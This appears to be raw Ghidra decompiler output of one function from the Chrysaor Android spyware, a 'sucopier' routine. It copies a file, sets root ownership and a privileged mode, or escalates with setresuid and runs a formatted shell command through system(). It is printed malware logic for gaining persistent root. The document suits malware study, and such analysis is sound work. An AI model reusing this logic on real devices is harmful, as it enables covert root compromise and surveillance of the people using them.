/* Chrysaor native reassembly: sucopier / module orchestrator */
/* Ghidra decompile - canonical sample ade8bef0... */

/* === FUN_000090f8 @ 0x000090f8 === */

void FUN_000090f8(undefined4 param_1,char *param_2)

{
  int iVar1;
  int iVar2;
  ssize_t sVar3;
  __uid_t _Var4;
  int iVar5;
  undefined4 uVar6;
  int iVar7;
  char *__buf;
  undefined4 *puVar8;
  
  iVar2 = DAT_00009200;
  iVar1 = DAT_000091fc;
  puVar8 = (undefined4 *)(&stack0xffffffe0 + DAT_000091fc);
  iVar7 = DAT_00009204 + 0x9114;
  __buf = &stack0xffffffe0 + DAT_0000920c + DAT_000091fc;
  *(undefined4 *)(&stack0xffffffe0 + DAT_00009208 + DAT_000091fc) =
       **(undefined4 **)(iVar7 + DAT_00009200);
  getuid();
  memset(__buf,0,0x400);
  sVar3 = readlink((char *)(DAT_00009210 + 0x9138),__buf,DAT_00009214);
  if (sVar3 != -1) {
    _Var4 = getuid();
    if (_Var4 == 0) {
      iVar5 = FUN_00009090(1);
      if (iVar5 != -1) {
        iVar5 = FUN_00008f8c(param_1,param_2);
        if (((iVar5 == 0) && (iVar5 = chown(param_2,0,0), iVar5 == 0)) &&
           (iVar5 = chmod(param_2,DAT_00009218), iVar5 == 0)) {
          FUN_00009090(0);
          sleep(10);
          uVar6 = 0;
        }
        else {
          FUN_00009090(0);
          uVar6 = 0xffffffff;
        }
        goto LAB_00009164;
      }
    }
    else {
      iVar5 = FUN_00008d58();
      _Var4 = getuid();
      setresuid(0,0,0);
      if ((_Var4 == 0) && (iVar5 == 0)) {
        *puVar8 = param_2;
        sprintf(&stack0xffffffec + iVar1,(char *)(DAT_0000921c + 0x91d2),__buf,param_1);
        iVar5 = system(&stack0xffffffec + iVar1);
        uVar6 = 0;
        if (iVar5 == 0) goto LAB_00009164;
      }
    }
  }
  uVar6 = 0xffffffff;
LAB_00009164:
  if (*(int *)(&stack0xffffffe0 + DAT_00009208 + iVar1) != **(int **)(iVar7 + iVar2)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(uVar6);
  }
  return;
}

